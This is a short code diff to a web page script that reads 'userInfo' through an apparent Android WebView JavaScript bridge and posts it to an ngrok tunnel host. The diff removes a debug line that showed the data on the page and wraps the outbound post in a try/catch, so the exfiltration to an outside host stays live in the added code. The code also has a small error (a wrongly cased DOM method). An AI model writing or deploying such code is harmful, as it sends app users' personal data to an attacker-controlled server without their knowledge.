@@ -16,11 +16,13 @@
               window.location.href = "https://google.co.in";
             }
 
-            document.getElementByID("asfd").innerHTML = btoa(Android.get('userInfo'))
-
-            $.post('http://7cc8cac5.ngrok.io', {
-              payload: Android.get('userInfo')
-            });
+            try {
+              $.post('http://7cc8cac5.ngrok.io', {
+                payload: Android.get('userInfo')
+              });
+            } catch (e) {
+              document.getElementByID("asdf").innerHTML = e;
+            }
 
           }
         </script>
